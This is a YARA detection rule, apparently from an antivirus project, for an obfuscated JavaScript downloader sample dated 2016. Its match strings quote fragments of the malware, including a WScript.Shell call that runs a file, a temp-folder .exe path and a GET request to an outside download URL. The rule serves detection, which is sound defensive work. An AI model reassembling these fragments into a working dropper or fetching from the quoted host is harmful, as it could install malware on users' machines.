rule sig_20160328_5d51646b5bc0169d8751a84dd352f862 {
  meta:
    description = "datamaliciousorder - file 20160328_5d51646b5bc0169d8751a84dd352f862.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "663703f350cd9f2ba7a18484a2f9917216570204c867d1b986d7d3f9cc711986"

  strings:
    $s1  = "function Tacjk() {return Ryvcfntbqk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BvZEwMnADopEzgO.exe\";};" fullword ascii
    $s2  = "Nmznui[Awowdskfki](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Twjvgclpvq](Lcnikoqme() * 11)} while (Nmznui[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xartvbrt(Lprdbxr, Qgzwbf){return Lprdbxr - Qgzwbf;};" fullword ascii
    $s5  = "var Ryvcfntbqk = function Tahtkxrefc() {return WScript[Fhwddctien](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Mrfoo(Zzepeczny){Ryvcfntbqk[\"Run\"](Zzepeczny, Hpgoyjhitk, Hpgoyjhitk);};" fullword ascii
    $s7  = "function Ewwnp() {return ((Wcsbnmi == true) && (Wcsbnmi == Adoaqntywh)) ? 1 : Hpgoyjhitk;};" fullword ascii
    $s8  = "function Yjdzsw(Pcqizu) {var Yzycujilfq = (1, 2, 3, 4, 5, Pcqizu); return Yzycujilfq;};" fullword ascii
    $s9  = "var Adoaqntywh = false;" fullword ascii
    $s10 = "var Htsyyqumk = new this[\"Date\"]();" fullword ascii
    $s11 = "var Wcsbnmi = false;" fullword ascii
    $s12 = "Wcsbnmi = true; " fullword ascii
    $s13 = "function Hboaur(){return Fhwddctien;};" fullword ascii
    $s14 = "var Nfwzju = false;" fullword ascii
    $s15 = " while (Ameooblssp){" fullword ascii
    $s16 = "function Mygfa(){return Nrzdhm;};" fullword ascii
    $s17 = "function Lurrdqmpe()" fullword ascii
    $s18 = "function Lcnikoqme(){return 22;};" fullword ascii
    $s19 = "return Xartvbrt(Wpktqcusei, Abgwk);" fullword ascii
    $s20 = "Adoaqntywh = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}